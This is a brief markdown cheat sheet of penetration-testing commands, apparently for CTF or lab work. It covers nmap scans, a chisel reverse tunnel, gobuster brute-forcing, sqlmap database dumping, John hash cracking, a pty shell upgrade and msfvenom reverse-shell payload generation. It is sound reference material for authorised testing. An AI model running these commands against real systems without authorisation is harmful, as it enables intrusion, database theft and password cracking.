#### Network
- ##### Nmap
    - Default scan for a ip `nmap -sC -Sv -oA <path/to/dir> <ip>`
    - Scan all ports for a ip `nmap -p- <ip>`
    - Default scan for a ip plus `UDP` `nmap -sU -sC -Sv -oA <path/to/dir> <ip>`
- ##### Chisel
    - On attack machine `chisel server --reverse -p <listen-port>`
    - On target machine `chisel client <ip-attack-machine> <listen-port-attack-machine> R:<local-port-to-forward>:<attack-ip-to-map>:<attack-port-map>`

#### Directory
- ##### Gobuster
    -  Scan for dir `gobuster dir -w </path/to/list/file> -t <#thread> -u <ip> -o </path/to/output/file> -x <ext>`
    - Scan for vhost `gobuster vhost -w </path/to/list/file> -t <#thread> -u <ip> -o </path/to/output/file>`

### SQLI
- ##### sqlmap
    - Grab databases name from a request `sqlmap -r sqli.req --dbs --batch`
    - Grab tables name from a request `sqlmap -r sqli.req -D <dbname> --tables`
    - Dump table from a request `sqlmap -r sqli.req -D <dbname> -T <tablename> --dump`

#### Cracking
- ##### John
    - Crack hash dictionary attack`john –wordlist=<path/to/dictionary> <path/to/hash>`


#### User
- User permission `sudo -l`

#### Upgrade shell
-  `python3 -c "import pty;pty.spawn('/bin/bash')"`

### Paylaods
- ##### msfvenom
    - Create paylaod for reverse shell `msfvenom -p <reverse/shell/payload> LHOST=<local-ip> LPORT=<local-port> -f <format-file> -o <output-file>`
